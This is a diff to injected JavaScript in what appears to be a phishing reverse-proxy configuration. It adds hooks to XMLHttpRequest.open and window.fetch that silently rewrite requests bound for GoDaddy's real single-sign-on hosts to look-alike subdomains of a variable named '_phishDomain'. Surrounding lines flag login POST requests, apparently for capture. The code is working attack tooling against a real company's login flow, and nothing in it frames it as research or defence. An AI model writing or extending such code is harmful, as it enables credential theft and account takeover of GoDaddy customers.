@@ -572,9 +572,21 @@ js_inject:
         var _oSend = XMLHttpRequest.prototype.send;
         var _xhrRespDesc = Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype, 'responseText');
         XMLHttpRequest.prototype.open = function(method, url) {
+          var originalUrl = url;
+          var _phishDomain = (function() {
+            var parts = window.location.hostname.split('.');
+            return parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
+          })();
+          // Rewrite real GoDaddy URLs to proxy domain BEFORE XHR
+          url = url.replace(/https?:\/\/sso2\.secureserver\.net/g, 'https://sssn2.' + _phishDomain)
+                   .replace(/https?:\/\/sso\.secureserver\.net/g,  'https://sssn.'  + _phishDomain)
+                   .replace(/https?:\/\/sso\.godaddy\.com/g,       'https://ssso.'  + _phishDomain);
+          if (url !== originalUrl) {
+            _log('XHR.open: rewriting URL from real domain to proxy');
+          }
           this._xm = method; this._xu = url;
           _log('XHR.open: ' + method + ' ' + url);
-          return _oOpen.apply(this, arguments);
+          return _oOpen.apply(this, [method, url]);
         };
         XMLHttpRequest.prototype.send = function(body) {
           _log('XHR.send: ' + this._xm + ' ' + this._xu + ', body length=' + (body ? body.length : 0));
@@ -637,6 +649,24 @@ js_inject:
         var _oFetch = window.fetch;
         window.fetch = function(url, opts) {
           var urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : '');
+          // Rewrite real GoDaddy URLs to proxy domain BEFORE fetch
+          var originalUrl = urlStr;
+          var _phishDomain = (function() {
+            var parts = window.location.hostname.split('.');
+            return parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
+          })();
+          urlStr = urlStr.replace(/https?:\/\/sso2\.secureserver\.net/g, 'https://sssn2.' + _phishDomain)
+                          .replace(/https?:\/\/sso\.secureserver\.net/g,  'https://sssn.'  + _phishDomain)
+                          .replace(/https?:\/\/sso\.godaddy\.com/g,       'https://ssso.'  + _phishDomain);
+          if (urlStr !== originalUrl) {
+            _log('fetch: rewriting URL from real domain to proxy: ' + originalUrl.substring(0, 80) + ' -> ' + urlStr.substring(0, 80));
+            // Update url parameter if it was a string
+            if (typeof url === 'string') {
+              url = urlStr;
+            } else if (url && url.url) {
+              url.url = urlStr;
+            }
+          }
           _log('fetch: ' + (opts && opts.method ? opts.method : 'GET') + ' ' + urlStr);
           var isLogin = urlStr.indexOf('/pass/login') !== -1 || urlStr.indexOf('/pass/my/token') !== -1 || urlStr.indexOf('/v1/login') !== -1 || urlStr.indexOf('/api/login') !== -1;
           if (opts && opts.method && opts.method.toUpperCase() === 'POST' && opts.body) {
